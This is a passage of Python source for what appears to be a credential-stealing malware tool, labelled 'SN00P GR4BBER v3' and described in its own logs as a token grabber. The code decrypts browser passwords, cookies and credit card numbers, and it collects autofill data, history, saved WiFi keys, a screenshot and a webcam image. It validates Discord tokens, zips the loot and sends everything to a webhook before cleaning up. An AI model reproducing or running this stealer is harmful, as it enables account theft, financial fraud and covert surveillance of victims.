        profile_output_dir = os.path.join(browser_stash_path, profile_name)
        os.makedirs(profile_output_dir, exist_ok=True)

        # File paths relative to profile_path
        login_data_path = os.path.join(profile_path, "Login Data")
        cookies_path = os.path.join(profile_path, "Cookies")
        history_path = os.path.join(profile_path, "History")
        web_data_path = os.path.join(profile_path, "Web Data")
        
        db_files = {
            "Login Data": login_data_path,
            "Cookies": cookies_path,
            "History": history_path,
            "Web Data": web_data_path
        }

        temp_db_files = {} # To store paths to copied DBs

        # 1. Copy database files to temporary location to avoid locks
        for db_name, original_path in db_files.items():
            if os.path.exists(original_path):
                try:
                    temp_db_file = tempfile.NamedTemporaryFile(delete=False, suffix=".sqlite", dir=TEMP_DIR)
                    temp_db_file.close()
                    shutil.copy2(original_path, temp_db_file.name)
                    temp_db_files[db_name] = temp_db_file.name
                except Exception as e:
                    Logger.error(f"Failed to copy {db_name} for {browser_name} ({profile_name}): {e}")
            else:
                Logger.info(f"{db_name} not found for {browser_name} ({profile_name}).")

        # 2. Extract data from copied databases
        
        # Passwords
        if "Login Data" in temp_db_files and master_key:
            passwords_file = os.path.join(profile_output_dir, "passwords.txt")
            with open(passwords_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser_name} ({profile_name}) Passwords ---\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["Login Data"])
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        if encrypted_password:
                            decrypted_password = decrypt_payload(encrypted_password, master_key)
                            if decrypted_password:
                                f.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
                    conn.close()
                except Exception as e:
                    f.write(f"Error extracting passwords: {e}\n")
                    Logger.error(f"Error extracting passwords for {browser_name} ({profile_name}): {e}")

        # Cookies (Netscape format)
        if "Cookies" in temp_db_files:
            cookies_file = os.path.join(profile_output_dir, "cookies.txt")
            with open(cookies_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"# HTTP Cookie File\n# {browser_name} ({profile_name}) Cookies\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["Cookies"])
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies")
                    for row in cursor.fetchall():
                        host_key, path, is_secure, expires_utc, name, encrypted_value = row
                        
                        value = "N/A"
                        if encrypted_value and master_key:
                            decrypted_value = decrypt_payload(encrypted_value, master_key)
                            if decrypted_value:
                                value = decrypted_value
                        elif encrypted_value: # Fallback for unencrypted cookies or if master_key is missing
                             try:
                                value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors='ignore')
                             except Exception:
                                pass # Keep as N/A if decryption fails
                        
                        f.write(f"{host_key}\t{'TRUE' if host_key.startswith('.') else 'FALSE'}\t{path}\t{'TRUE' if is_secure else 'FALSE'}\t{expires_utc}\t{name}\t{value}\n")
                    conn.close()
                except Exception as e:
                    f.write(f"Error extracting cookies: {e}\n")
                    Logger.error(f"Error extracting cookies for {browser_name} ({profile_name}): {e}")

        # History
        if "History" in temp_db_files:
            history_file = os.path.join(profile_output_dir, "history.txt")
            with open(history_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser_name} ({profile_name}) History ---\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["History"])
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                    for row in cursor.fetchall():
                        url, title, visit_count, last_visit_time = row
                        # Chromium timestamps are in microseconds since 1601-01-01
                        # Convert to human-readable datetime
                        if last_visit_time:
                            try:
                                dt_object = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit_time)
                                last_visit_str = dt_object.strftime("%Y-%m-%d %H:%M:%S")
                            except Exception:
                                last_visit_str = "N/A"
                        else:
                            last_visit_str = "N/A"
                        f.write(f"URL: {url}\nTitle: {title}\nVisits: {visit_count}\nLast Visit: {last_visit_str}\n\n")
                    conn.close()
                except Exception as e:
                    f.write(f"Error extracting history: {e}\n")
                    Logger.error(f"Error extracting history for {browser_name} ({profile_name}): {e}")

        # Credit Cards & Autofill
        if "Web Data" in temp_db_files and master_key:
            web_data_file = os.path.join(profile_output_dir, "web_data.txt")
            with open(web_data_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser_name} ({profile_name}) Credit Cards & Autofill ---\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["Web Data"])
                    cursor = conn.cursor()

                    # Credit Cards
                    f.write("--- Credit Cards ---\n")
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in cursor.fetchall():
                        name_on_card, exp_month, exp_year, encrypted_card_number = row
                        if encrypted_card_number:
                            decrypted_card_number = decrypt_payload(encrypted_card_number, master_key)
                            if decrypted_card_number:
                                f.write(f"Name: {name_on_card}\nNumber: {decrypted_card_number}\nExpires: {exp_month}/{exp_year}\n\n")
                    
                    # Autofill (Addresses, Names, Emails, Phone Numbers)
                    f.write("\n--- Autofill Data ---\n")
                    cursor.execute("SELECT name, value FROM autofill")
                    for row in cursor.fetchall():
                        f.write(f"{row[0]}: {row[1]}\n")

                    conn.close()
                except Exception as e:
                    f.write(f"Error extracting web data: {e}\n")
                    Logger.error(f"Error extracting web data for {browser_name} ({profile_name}): {e}")

        # 3. Clean up temporary copied databases
        for _, temp_path in temp_db_files.items():
            cleanup_temp_files(temp_path)

# MODIFICATION: New function to get WiFi information
def get_wifi_info():
    wifi_info = {"current_network": {"SSID": "Unknown", "BSSID": "Unknown", "Signal": "Unknown", "Authentication": "Unknown"}, "saved_networks": []}
    try:
        # Get current Wi-Fi interface info
        interfaces_output = subprocess.check_output("netsh wlan show interfaces", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
        
        current_ssid_match = re.search(r"SSID\s*:\s*(.*)", interfaces_output)
        current_bssid_match = re.search(r"BSSID\s*:\s*(.*)", interfaces_output)
        current_signal_match = re.search(r"Signal\s*:\s*(\d+)%", interfaces_output)
        current_auth_match = re.search(r"Authentication\s*:\s*(.*)", interfaces_output)

        current_network_details = {
            "SSID": current_ssid_match.group(1).strip() if current_ssid_match else "N/A",
            "BSSID": current_bssid_match.group(1).strip() if current_bssid_match else "N/A",
            "Signal": current_signal_match.group(1).strip() + "%" if current_signal_match else "N/A",
            "Authentication": current_auth_match.group(1).strip() if current_auth_match else "N/A"
        }
        wifi_info["current_network"] = current_network_details

        # Get saved Wi-Fi profiles
        profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
        profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_output)

        for profile_name in profile_names:
            profile_name = profile_name.strip()
            profile_details = {"SSID": profile_name, "Key": "N/A"}
            try:
                key_output = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.DEVNULL, encoding='utf-8', errors='ignore')
                key_match = re.search(r"Key Content\s*:\s*(.*)", key_output)
                if key_match:
                    profile_details["Key"] = key_match.group(1).strip()
            except Exception as e:
                Logger.warning(f"Could not retrieve key for profile '{profile_name}': {e}")
            wifi_info["saved_networks"].append(profile_details)

        Logger.info("Successfully gathered WiFi information.")
    except Exception as e:
        Logger.error(f"Failed to gather WiFi information: {e}")
    return wifi_info

def get_system_info(ip_address, wifi_data):
    system_info = {}
    
    # OS Info
    try:
        os_name = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        os_arch = platform.machine() 
        system_info['OS'] = f"{os_name} {os_release} (Build {os_version}) {os_arch}"
    except Exception as e:
        system_info['OS'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get OS info: {e}")

    # PC Name
    try:
        system_info['PC Name'] = platform.node()
    except Exception as e:
        system_info['PC Name'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get PC Name: {e}")
    
    # CPU Info (PowerShell for Name, psutil for cores)
    try:
        cpu_name_ps = _run_powershell_command("(Get-CimInstance Win32_Processor).Name")
        physical_cores = psutil.cpu_count(logical=False)
        logical_cores = psutil.cpu_count(logical=True)
        system_info['CPU Info'] = f"{cpu_name_ps} (Physical Cores: {physical_cores}, Logical Threads: {logical_cores})"
    except Exception as e:
        system_info['CPU Info'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get CPU info: {e}")
    
    # RAM Info
    try:
        ram = psutil.virtual_memory()
        system_info['Total RAM'] = f"{ram.total / (1024**3):.2f} GB"
        system_info['Used RAM'] = f"{ram.used / (1024**3):.2f} GB ({ram.percent:.2f}%)"
    except Exception as e:
        system_info['Total RAM'] = f"Unknown (Error: {e})"
        system_info['Used RAM'] = f"Unknown (Error: {e})"
        Logger.warning(f"Could not get RAM info: {e}")

    # GPU Info (PowerShell)
    system_info['GPU Model'] = _run_powershell_command("Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name")

    # HWID (UUID) (PowerShell)
    system_info['HWID'] = _run_powershell_command("(Get-CimInstance Win32_ComputerSystemProduct).UUID")

    # Network Info (City, Country, ISP, Proxy/VPN)
    network_info = {'City': 'Unknown', 'Country': 'Unknown', 'ISP': 'Unknown', 'Proxy/VPN': 'Unknown'}
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting") as response: 
            ip_api_data = json.loads(response.read().decode())
            network_info['City'] = ip_api_data.get('city', 'Unknown')
            network_info['Country'] = ip_api_data.get('country', 'Unknown')
            network_info['ISP'] = ip_api_data.get('isp', 'Unknown')
            is_proxy_vpn = "Yes" if ip_api_data.get('proxy') or ip_api_data.get('hosting') else "No"
            network_info['Proxy/VPN'] = is_proxy_vpn
    except Exception as e:
        Logger.warning(f"Could not get network info from ip-api.com: {e}")
    system_info['Network Info'] = network_info
    
    # Add WiFi info to system_info for embed creation
    system_info['WiFi Info'] = wifi_data

    Logger.info("Successfully gathered system information.")
    return system_info

def create_system_embed(system_info, ip_address):
    embed = {
        "title": "💻 **SYSTEM INFORMATION**",
        "description": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "color": 0x2b2d31,
        "fields": [
            {"name": "🖥️ PC Name", "value": f"```{system_info.get('PC Name', 'Unknown')}```", "inline": True},
            {"name": "🆔 HWID (UUID)", "value": f"```{system_info.get('HWID', 'Unknown')}```", "inline": True},
            {"name": "🌐 OS", "value": f"```{system_info.get('OS', 'Unknown')}```", "inline": False},
            {"name": "🧠 CPU", "value": f"```{system_info.get('CPU Info', 'Unknown')}```", "inline": False},
            {"name": "💡 GPU", "value": f"```{system_info.get('GPU Model', 'Unknown')}```", "inline": False},
            {"name": "💾 RAM", "value": f"```Total: {system_info.get('Total RAM', 'Unknown')} | Used: {system_info.get('Used RAM', 'Unknown')}```", "inline": False},
            
            {"name": "🌍 **NETWORK & LOCATION**", "value": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", "inline": False},
            {"name": "📍 IP Address", "value": f"```{ip_address}```", "inline": True},
            {"name": "🏙️ City", "value": f"```{system_info['Network Info'].get('City', 'Unknown')}```", "inline": True},
            {"name": "🗺️ Country", "value": f"```{system_info['Network Info'].get('Country', 'Unknown')}```", "inline": True},
            {"name": "📡 ISP", "value": f"```{system_info['Network Info'].get('ISP', 'Unknown')}```", "inline": True},
            {"name": "🕵️ Proxy/VPN", "value": f"```{system_info['Network Info'].get('Proxy/VPN', 'Unknown')}```", "inline": True},
            
            {"name": "📶 **WIFI INFORMATION**", "value": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", "inline": False},
            {"name": "Current SSID", "value": f"```{system_info['WiFi Info']['current_network'].get('SSID', 'Unknown')}```", "inline": True},
            {"name": "Current BSSID", "value": f"```{system_info['WiFi Info']['current_network'].get('BSSID', 'Unknown')}```", "inline": True},
            {"name": "Current Signal", "value": f"```{system_info['WiFi Info']['current_network'].get('Signal', 'Unknown')}```", "inline": True},
            {"name": "Current Auth", "value": f"```{system_info['WiFi Info']['current_network'].get('Authentication', 'Unknown')}```", "inline": True},
        ],
        "footer": {
            "text": "SN00P GR4BBER v3 | " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "icon_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg"
        },
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
    }
    return embed

def main():
    Logger.info("Starting token grabber")
    ip = get_ip()
    Logger.info(f"IP Address: {ip}")
    
    # Create Snoop_V3_Stash directory
    if os.path.exists(SNOOP_STASH_DIR):
        shutil.rmtree(SNOOP_STASH_DIR) # Clean up previous stash if exists
    os.makedirs(SNOOP_STASH_DIR, exist_ok=True)
    Logger.info(f"Created temporary stash directory: {SNOOP_STASH_DIR}")

    # --- Media Capture ---
    media_stash_dir = os.path.join(SNOOP_STASH_DIR, "Media")
    os.makedirs(media_stash_dir, exist_ok=True)
    
    screenshot_path = capture_screenshot()
    if screenshot_path and os.path.exists(screenshot_path):
        shutil.move(screenshot_path, os.path.join(media_stash_dir, os.path.basename(screenshot_path)))
        Logger.info(f"Moved screenshot to {media_stash_dir}")
        screenshot_path = os.path.join(media_stash_dir, os.path.basename(screenshot_path)) # Update path to new location
    
    webcam_path = capture_webcam()
    if webcam_path and os.path.exists(webcam_path):
        shutil.move(webcam_path, os.path.join(media_stash_dir, os.path.basename(webcam_path)))
        Logger.info(f"Moved webcam image to {media_stash_dir}")
        webcam_path = os.path.join(media_stash_dir, os.path.basename(webcam_path)) # Update path to new location

    # --- WiFi Info ---
    wifi_data = get_wifi_info()
    network_stash_dir = os.path.join(SNOOP_STASH_DIR, "Network")
    os.makedirs(network_stash_dir, exist_ok=True)
    wifi_file_path = os.path.join(network_stash_dir, "wifi_info.txt")
    try:
        with open(wifi_file_path, "w", encoding="utf-8", errors="ignore") as f:
            f.write("--- Current WiFi Network ---\n")
            for k, v in wifi_data["current_network"].items():
                f.write(f"{k}: {v}\n")
            f.write("\n--- Saved WiFi Networks ---\n")
            if wifi_data["saved_networks"]:
                for network in wifi_data["saved_networks"]:
                    f.write(f"SSID: {network['SSID']}\nKey: {network['Key']}\n\n")
            else:
                f.write("No saved networks found.\n")
        Logger.info(f"WiFi info saved to {wifi_file_path}")
    except Exception as e:
        Logger.error(f"Failed to save WiFi info to file: {e}")

    # --- System Info & Embed Creation ---
    system_info = get_system_info(ip, wifi_data) # Pass wifi_data here
    system_embed = create_system_embed(system_info, ip)

    # --- Browser Data Extraction (Parallelized) ---
    browser_extraction_threads = []
    with ThreadPoolExecutor(max_workers=min(len(BROWSER_TARGETS), os.cpu_count() or 1)) as executor:
        for browser_name, browser_path in BROWSER_TARGETS.items():
            browser_extraction_threads.append(executor.submit(extract_browser_data, browser_name, browser_path, SNOOP_STASH_DIR))
    
    # Wait for all browser extraction threads to complete
    for future in browser_extraction_threads:
        future.result() # This will re-raise any exceptions from the threads

    # --- Discord Token Extraction ---
    found_tokens = []
    discord_token_threads = []
    with ThreadPoolExecutor(max_workers=len(PATHS)) as executor:
        for platform_name, path in PATHS.items():
            discord_token_threads.append(executor.submit(lambda p=platform_name, pa=path: found_tokens.extend(get_tokens(p, pa))))
    
    for future in discord_token_threads:
        future.result() # Wait for all Discord token threads to complete

    all_embeds = [system_embed]
    unique_tokens = []
    for token, platform_name in found_tokens:
        if not re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", token):
            Logger.info(f"Skipping invalid token format from {platform_name}: {token}")
            continue
        if token not in [t[0] for t in unique_tokens]:
            try:
                req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(token))
                with urllib.request.urlopen(req) as response:
                    if response.status == 200:
                        user_data = json.loads(response.read().decode())
                        unique_tokens.append((token, platform_name))
                        Logger.info(f"Valid token found for user: {user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0')} on {platform_name}")
                        token_embed = create_token_embed(token, user_data, platform_name)
                        all_embeds.append(token_embed)
                    else:
                        Logger.error(f"Token validation failed on {platform_name} with status {response.status}: {response.reason}")
            except Exception as e:
                Logger.error(f"Failed to validate token on {platform_name}: {e}")

    # --- Send Embeds (System + Network + WiFi + Discord Tokens) ---
    if all_embeds:
        send_to_webhook(all_embeds)
    else:
        Logger.info("No embeds to send.")

    # --- Create ZIP Archive ---
    final_username = "UnknownUser"
    if unique_tokens:
        # Try to get a username from the first valid token
        try:
            first_token_user_data = json.loads(urllib.request.urlopen(urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(unique_tokens[0][0]))).read().decode())
            final_username = re.sub(r'[^\w\-_\.]', '_', first_token_user_data.get('username', final_username))
        except Exception as e:
            Logger.warning(f"Could not get username for ZIP name: {e}")
    
    snoop_report_zip_final = f"{SNOOP_REPORT_ZIP_BASE}{final_username}.zip"
    
    try:
        shutil.make_archive(snoop_report_zip_final.replace(".zip", ""), 'zip', SNOOP_STASH_DIR)
        Logger.info(f"Created ZIP archive: {snoop_report_zip_final}")
    except Exception as e:
        Logger.error(f"Failed to create ZIP archive: {e}")
        snoop_report_zip_final = None # Ensure it's None if creation fails

    # --- Send ZIP Archive ---
    if snoop_report_zip_final and os.path.exists(snoop_report_zip_final):
        send_file_to_webhook(snoop_report_zip_final, ip, content_msg=f"Snoop Report for {final_username}")
    else:
        Logger.warning("No ZIP archive to send.")

    # --- Cleanup ---
    cleanup_temp_files(screenshot_path, webcam_path, snoop_report_zip_final)
    if os.path.exists(SNOOP_STASH_DIR):
        try:
            shutil.rmtree(SNOOP_STASH_DIR)
            Logger.info(f"Cleaned up stash directory: {SNOOP_STASH_DIR}")
        except Exception as e:
            Logger.error(f"Failed to delete stash directory '{SNOOP_STASH_DIR}': {e}")

    Logger.info("Grabber finished execution.")

if __name__ == "__main__":
    main()